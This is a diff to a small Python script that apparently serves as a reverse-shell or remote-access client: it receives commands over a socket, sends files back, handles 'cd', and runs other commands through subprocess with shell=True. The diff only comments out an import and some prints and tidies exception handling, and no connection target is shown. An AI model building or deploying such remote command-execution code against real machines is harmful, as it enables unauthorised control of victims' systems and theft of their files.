@@ -1,6 +1,6 @@
 import socket, subprocess as sp,sys
 import os, locale
-import base64
+#import base64
 
 #setting local encoding pref
 locenc = locale.getpreferredencoding()
@@ -27,15 +27,17 @@ while True:
                 #data = base64.b64encode(data)
                 #data=(str(data).replace("b'","").replace("'",""))
                 conn.sendall(data)
+                """
                 print("")
                 print ("file has been sent successfully")
                 print("")
-                
+                """
         elif command.startswith('cd') :
             try:
+                
                 os.chdir(command.split(' ')[1])
-            except :
-                pass
+            except Exception as e :
+                pass #print(e)
         else :
             sh = sp.Popen(command, shell=True,
                           stdout=sp.PIPE,
